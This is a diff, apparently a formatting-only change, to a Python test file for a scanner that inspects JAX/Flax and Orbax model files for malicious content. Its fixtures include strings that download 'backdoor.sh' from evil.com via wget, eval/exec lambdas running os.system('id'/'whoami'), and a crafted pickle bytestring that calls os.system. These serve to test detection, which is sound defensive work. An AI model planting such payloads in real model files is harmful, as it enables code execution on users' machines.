@@ -18,24 +18,40 @@ class TestJaxFlaxIntegration:
         return {
             "params": {
                 "embeddings": {
-                    "token_embedding": np.random.normal(0, 0.1, (1000, 128)).astype(np.float32).tobytes(),
-                    "position_embedding": np.random.normal(0, 0.1, (512, 128)).astype(np.float32).tobytes(),
+                    "token_embedding": np.random.normal(0, 0.1, (1000, 128))
+                    .astype(np.float32)
+                    .tobytes(),
+                    "position_embedding": np.random.normal(0, 0.1, (512, 128))
+                    .astype(np.float32)
+                    .tobytes(),
                 },
                 "encoder": {
                     "layer_0": {
                         "self_attention": {
-                            "query": np.random.normal(0, 0.1, (128, 128)).astype(np.float32).tobytes(),
-                            "key": np.random.normal(0, 0.1, (128, 128)).astype(np.float32).tobytes(),
-                            "value": np.random.normal(0, 0.1, (128, 128)).astype(np.float32).tobytes(),
+                            "query": np.random.normal(0, 0.1, (128, 128))
+                            .astype(np.float32)
+                            .tobytes(),
+                            "key": np.random.normal(0, 0.1, (128, 128))
+                            .astype(np.float32)
+                            .tobytes(),
+                            "value": np.random.normal(0, 0.1, (128, 128))
+                            .astype(np.float32)
+                            .tobytes(),
                         },
                         "feed_forward": {
-                            "intermediate": np.random.normal(0, 0.1, (128, 512)).astype(np.float32).tobytes(),
-                            "output": np.random.normal(0, 0.1, (512, 128)).astype(np.float32).tobytes(),
+                            "intermediate": np.random.normal(0, 0.1, (128, 512))
+                            .astype(np.float32)
+                            .tobytes(),
+                            "output": np.random.normal(0, 0.1, (512, 128))
+                            .astype(np.float32)
+                            .tobytes(),
                         },
                     }
                 },
                 "classifier": {
-                    "dense": np.random.normal(0, 0.1, (128, 10)).astype(np.float32).tobytes(),
+                    "dense": np.random.normal(0, 0.1, (128, 10))
+                    .astype(np.float32)
+                    .tobytes(),
                 },
             },
             "opt_state": {
@@ -60,7 +76,9 @@ class TestJaxFlaxIntegration:
         return {
             "params": {
                 "embeddings": {
-                    "token_embedding": np.random.normal(0, 0.1, (100, 64)).astype(np.float32).tobytes(),
+                    "token_embedding": np.random.normal(0, 0.1, (100, 64))
+                    .astype(np.float32)
+                    .tobytes(),
                 }
             },
             "__jax_array__": {
@@ -72,7 +90,12 @@ class TestJaxFlaxIntegration:
                 "restore_fn": "lambda x: eval(x) if hasattr(__builtins__, 'eval') else exec(x)",
                 "custom_serializer": "subprocess.run(['wget', 'http://evil.com/backdoor.sh'])",
             },
-            "malicious_tensors": {"negative_dims": {"shape": [-1, -100, -1000], "dtype": "malicious_dtype"}},
+            "malicious_tensors": {
+                "negative_dims": {
+                    "shape": [-1, -100, -1000],
+                    "dtype": "malicious_dtype",
+                }
+            },
             "__tree_flatten__": 'lambda: eval(\'__import__("os").system("id")\')',
             "model_config": {
                 "custom_activation": 'lambda x: eval(\'__import__("os").system("whoami")\') or x',
@@ -96,10 +119,12 @@ class TestJaxFlaxIntegration:
         assert result.success
 
         # Should have minimal issues
-        critical_issues = [i for i in result.issues if i.severity == IssueSeverity.CRITICAL]
-        assert len(critical_issues) == 0, (
-            f"Clean model triggered critical issues: {[i.message for i in critical_issues]}"
-        )
+        critical_issues = [
+            i for i in result.issues if i.severity == IssueSeverity.CRITICAL
+        ]
+        assert (
+            len(critical_issues) == 0
+        ), f"Clean model triggered critical issues: {[i.message for i in critical_issues]}"
 
         # Architecture should be detected
         assert result.metadata.get("model_architecture") == "transformer"
@@ -119,16 +144,29 @@ class TestJaxFlaxIntegration:
         assert result.success
 
         # Should trigger multiple critical issues
-        critical_issues = [i for i in result.issues if i.severity == IssueSeverity.CRITICAL]
-        assert len(critical_issues) >= 10, f"Expected many critical issues, got {len(critical_issues)}"
+        critical_issues = [
+            i for i in result.issues if i.severity == IssueSeverity.CRITICAL
+        ]
+        assert (
+            len(critical_issues) >= 10
+        ), f"Expected many critical issues, got {len(critical_issues)}"
 
         # Check for specific threat patterns
         issue_messages = [i.message.lower() for i in critical_issues]
 
-        expected_patterns = ["jax_array", "orbax", "eval", "exec", "subprocess", "negative dimensions"]
+        expected_patterns = [
+            "jax_array",
+            "orbax",
+            "eval",
+            "exec",
+            "subprocess",
+            "negative dimensions",
+        ]
 
         for pattern in expected_patterns:
-            assert any(pattern in msg for msg in issue_messages), f"Missing detection of {pattern}"
+            assert any(
+                pattern in msg for msg in issue_messages
+            ), f"Missing detection of {pattern}"
 
     def test_file_extension_support(self, tmp_path):
         """Test support for various JAX/Flax file extensions."""
@@ -142,7 +180,9 @@ class TestJaxFlaxIntegration:
                 msgpack.pack(simple_model, f)
 
             # Test scanner can handle the extension
-            assert FlaxMsgpackScanner.can_handle(str(model_path)), f"Cannot handle {ext} extension"
+            assert FlaxMsgpackScanner.can_handle(
+                str(model_path)
+            ), f"Cannot handle {ext} extension"
 
             # Test actual scanning
             scanner = FlaxMsgpackScanner()
@@ -152,14 +192,22 @@ class TestJaxFlaxIntegration:
     def test_large_model_support(self, tmp_path):
         """Test support for large JAX/Flax models."""
         # Create a model with 100MB+ of data
-        large_embedding = np.random.normal(0, 0.1, (100000, 512)).astype(np.float32).tobytes()
+        large_embedding = (
+            np.random.normal(0, 0.1, (100000, 512)).astype(np.float32).tobytes()
+        )
 
         large_model = {
             "params": {
                 "large_embedding": large_embedding,
-                "classifier": np.random.normal(0, 0.1, (512, 1000)).astype(np.float32).tobytes(),
+                "classifier": np.random.normal(0, 0.1, (512, 1000))
+                .astype(np.float32)
+                .tobytes(),
             },
-            "metadata": {"model_type": "embedding", "embedding_size": 512, "vocab_size": 100000},
+            "metadata": {
+                "model_type": "embedding",
+                "embedding_size": 512,
+                "vocab_size": 100000,
+            },
         }
 
         model_path = tmp_path / "large_model.flax"
@@ -184,7 +232,11 @@ class TestJaxFlaxIntegration:
             "version": "0.1.0",
             "type": "orbax_checkpoint",
             "format": "flax",
-            "model_config": {"architecture": "transformer", "layers": 1, "hidden_size": 128},
+            "model_config": {
+                "architecture": "transformer",
+                "layers": 1,
+                "hidden_size": 128,
+            },
         }
 
         # Clean parameter data
@@ -192,7 +244,9 @@ class TestJaxFlaxIntegration:
             "model": {
                 "embeddings": {
                     "vocab_size": 1000,
-                    "weights": np.random.normal(0, 0.1, (1000, 128)).astype(np.float32).tolist(),
+                    "weights": np.random.normal(0, 0.1, (1000, 128))
+                    .astype(np.float32)
+                    .tolist(),
                 }
             }
         }
@@ -210,10 +264,12 @@ class TestJaxFlaxIntegration:
         assert result.metadata.get("checkpoint_type") == "orbax_checkpoint"
 
         # Should have minimal critical issues
-        critical_issues = [i for i in result.issues if i.severity == IssueSeverity.CRITICAL]
-        assert len(critical_issues) == 0, (
-            f"Clean Orbax checkpoint triggered critical issues: {[i.message for i in critical_issues]}"
-        )
+        critical_issues = [
+            i for i in result.issues if i.severity == IssueSeverity.CRITICAL
+        ]
+        assert (
+            len(critical_issues) == 0
+        ), f"Clean Orbax checkpoint triggered critical issues: {[i.message for i in critical_issues]}"
 
     def test_malicious_orbax_checkpoint(self, tmp_path):
         """Test detection of malicious Orbax checkpoints."""
@@ -235,7 +291,9 @@ class TestJaxFlaxIntegration:
             json.dump(malicious_metadata, f)
 
         # Create dangerous pickle file
-        dangerous_pickle = b"\x80\x03cos\nsystem\nq\x00X\x06\x00\x00\x00whoamiq\x01\x85q\x02Rq\x03."
+        dangerous_pickle = (
+            b"\x80\x03cos\nsystem\nq\x00X\x06\x00\x00\x00whoamiq\x01\x85q\x02Rq\x03."
+        )
 
         with open(orbax_dir / "checkpoint", "wb") as f:
             f.write(dangerous_pickle)
@@ -246,12 +304,18 @@ class TestJaxFlaxIntegration:
         assert result.success
 
         # Should trigger critical issues
-        critical_issues = [i for i in result.issues if i.severity == IssueSeverity.CRITICAL]
-        assert len(critical_issues) >= 3, f"Expected multiple critical issues, got {len(critical_issues)}"
+        critical_issues = [
+            i for i in result.issues if i.severity == IssueSeverity.CRITICAL
+        ]
+        assert (
+            len(critical_issues) >= 3
+        ), f"Expected multiple critical issues, got {len(critical_issues)}"
 
         # Check for pickle opcode detection
         issue_messages = [i.message.lower() for i in result.issues]
-        assert any("pickle opcode" in msg for msg in issue_messages), "Should detect dangerous pickle opcodes"
+        assert any(
+            "pickle opcode" in msg for msg in issue_messages
+        ), "Should detect dangerous pickle opcodes"
 
     def test_jax_specific_architecture_detection(self, tmp_path):
         """Test JAX-specific model architecture detection."""
@@ -260,7 +324,10 @@ class TestJaxFlaxIntegration:
                 "model": {
                     "params": {
                         "transformer": {
-                            "attention": {"query": b"\x00" * 1000, "key": b"\x00" * 1000},
+                            "attention": {
+                                "query": b"\x00" * 1000,
+                                "key": b"\x00" * 1000,
+                            },
                             "feed_forward": {"dense": b"\x00" * 2000},
                         }
                     }
@@ -270,7 +337,10 @@ class TestJaxFlaxIntegration:
             {
                 "model": {
                     "params": {
-                        "conv_layers": {"conv1": b"\x00" * 3000, "conv2": b"\x00" * 3000},
+                        "conv_layers": {
+                            "conv1": b"\x00" * 3000,
+                            "conv2": b"\x00" * 3000,
+                        },
                         "pooling": {"pool1": b"\x00" * 100},
                     }
                 },
@@ -280,11 +350,16 @@ class TestJaxFlaxIntegration:
                 "model": {
                     "params": {
                         "embeddings": {
-                            "token_embedding": np.random.normal(0, 0.1, (50000, 300)).astype(np.float32).tobytes(),
+                            "token_embedding": np.random.normal(0, 0.1, (50000, 300))
+                            .astype(np.float32)
+                            .tobytes(),
                         }
                     }
                 },
-                "expected_arch": ["embedding", "transformer"],  # May be detected as either
+                "expected_arch": [
+                    "embedding",
+                    "transformer",
+                ],  # May be detected as either
             },
         ]
 
@@ -303,7 +378,9 @@ class TestJaxFlaxIntegration:
                 else [test_case["expected_arch"]]
             )
             actual_arch = result.metadata.get("model_architecture")
-            assert actual_arch in expected_archs, f"Expected one of {expected_archs}, got {actual_arch}"
+            assert (
+                actual_arch in expected_archs
+            ), f"Expected one of {expected_archs}, got {actual_arch}"
 
     def test_integration_with_cli(self, tmp_path):
         """Test that enhanced JAX/Flax scanning works through CLI."""
